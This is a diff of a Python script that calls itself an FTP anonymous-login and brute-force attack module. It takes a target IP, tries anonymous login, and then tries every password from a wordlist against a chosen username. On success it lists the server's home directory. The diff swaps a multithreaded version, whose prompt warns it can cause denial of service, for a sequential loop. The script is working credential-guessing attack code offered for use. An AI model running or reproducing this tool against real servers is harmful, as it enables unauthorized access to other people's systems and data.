@@ -4,15 +4,12 @@
 import ftplib
 import re
 import sys, time, os
-from multiprocessing.dummy import Pool as ThreadPool
-import itertools
 
 validIP = re.compile('^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')
 line = '------------------------------------'
 i = 0
-
-start = ''
-
+	
+## -- Initialization -- ##
 def Start0():
 	print("Welcome to the FTP Anonymous login/Brute Force Module")
 	print("Target Host IP required")
@@ -22,6 +19,7 @@ def Start0():
 	print("Option 2: Brute Force")
 	Start1()
 
+## -- Gathering target host information. -- ##
 def Start1():
 	ftpTarget = input("Target Host: ")
 	if validIP.match(ftpTarget):
@@ -31,6 +29,7 @@ def Start1():
 		print('Please enter a valid IP')
 		Start1()
 
+## -- Selecting anon or username logins -- ##
 def Start2(ftpTarget):
 	answeR = input('Select an Option. [1]: ')
 	if(answeR == '' or answeR == '1'):
@@ -38,6 +37,8 @@ def Start2(ftpTarget):
 	elif(answeR == '2'):
 		ftpinitBF(ftpTarget)
 
+
+## -- pre check on target host to determine if it is up/accepting FTP connections -- ##
 def ftpCheck(ftpTarget):
 	ftp = ftplib.FTP(ftpTarget)
 	try:
@@ -47,6 +48,7 @@ def ftpCheck(ftpTarget):
 		print('Target Host down or FTP is being filtered by Firewall')
 		Start1()
 
+## -- FTP anonymous login section -- ##
 def ftpAnon(ftpTarget):
 	ftp = ftplib.FTP(ftpTarget)	
 	try:
@@ -60,70 +62,46 @@ def ftpAnon(ftpTarget):
 	except Exception as E:
 		print('Anonymous Login Unsuccessful :(')
 
+##  -- Username as PW bruteforce section -- ##
 def ftpinitBF(ftpTarget):
 	ftpuName = input('Enter username to BF: ')
 	ftppwFile = input("Password List File: ")
 	if (os.path.isfile (ftppwFile)):
 		answeR = input(('Username: %s - List: %s Loaded. Confirm [Y/n]: ' % (ftpuName, ftppwFile)))
 		if(answeR == '' or answeR == 'y'):
-			ftptCount(ftpTarget, ftpuName, ftppwFile)
+			ftpBF1(ftpTarget, ftpuName, ftppwFile)
 		elif(answeR == 'n'):
 			ftpinitBF(ftpTarget)
 	else:
 		print('Please enter a valid file')
 		ftpinitBF(ftpTarget)
 		
-def ftptCount(ftpTarget, ftpuName, ftppwFile):
-	tCount = int(input('How many threads? 400 MAX - Can cause DOS: '))
-	if tCount in range(1,401):
-		answeR = input(('%s Threads Selected. Continue? [Y/n]:' % (tCount)))
-		if(answeR == '' or answeR == 'y'):
-			ftpBF1(ftpTarget, ftpuName, ftppwFile, tCount)
-		elif(answeR == 'n'):
-			ftptCount(ftpTarget, ftpuName, ftppwFile)
-		else:
-			print('Invalid Selection')
-			ftptCount(ftpTarget, ftpuName, ftppwFile)
-	else:
-		print('Invalid Selection')
-		ftptCount(ftpTarget, ftpuName, ftppwFile)
-					
-def ftpBF1(ftpTarget, ftpuName, ftppwFile, tCount):
-	global start
-	pooL = ThreadPool(tCount)
-	total = sum(1 for line in open(ftppwFile))
-	passworD = []
-	awshet = [ftpTarget, ftpuName, total]
-	with open(ftppwFile) as pwList:
-		for pW in pwList:
-			passworD.append(pW)
-	start = time.time()
-	progress(i,total)
-	pooL.map( ftpBF2, zip(passworD, itertools.repeat(awshet)))
-	print('')
-	pooL.close()
-	pooL.join()
-
-def ftpBF2(cB):
+def ftpBF1(ftpTarget, ftpuName, ftppwFile):
 	global i
-	pD = cB[0].strip()
-	cheA = cB[1]
-	tG, uNa, tT = cheA
-	uN = uNa.strip()
-	time.sleep(.01)	
-	try:
-		ftp = ftplib.FTP(tG)
-		ftp.login(uN, pD)
-		print(('\nUsername %s - PW - %s Successful' % (uN, pD)))
-		end = time.time()
-		print(end - start)
-		os._exit(0)
-	except Exception as E:
-		i = i + 1
-		progress(i,tT)
-		pass
-	
-		
+	total = 0
+#	ftp = ftplib.FTP(ftpTarget)
+	with open(ftppwFile, 'rb') as Counter:
+		for line in Counter:
+			total = total + 1 
+	with open(ftppwFile, 'r') as pwList:
+		for pW in pwList:
+			try:
+				ftp = ftplib.FTP(ftpTarget)
+				response = ftp.login(ftpuName, pW.strip())
+				print(line)
+				print('--------HOME DIRECTORY LIST---------')
+				print(line)
+				ftp.retrlines('LIST')
+				ftp.quit()
+				exit()
+			except Exception as E:
+				print('lame')
+				i = i + 1
+				progress(i,total)
+				time.sleep(.01)
+				pass
+## -- End FTP BF section -- ##
+## -- Progress bar -- ##
 def progress(count, total):
 	bar_len = 38
 	filled_len = int(round(bar_len * count / float(total)))
@@ -142,10 +120,4 @@ if __name__ == '__main__':
 		print('-----------------------------------------------------')
 		print("\nUser Interrupt. Exiting FTP Brute Force Attack Module")
 		print('-----------------------------------------------------')
-		
-		
 
-#	try:
-#		ftp.connect()
-#	except Exception as E:
-#		pass  
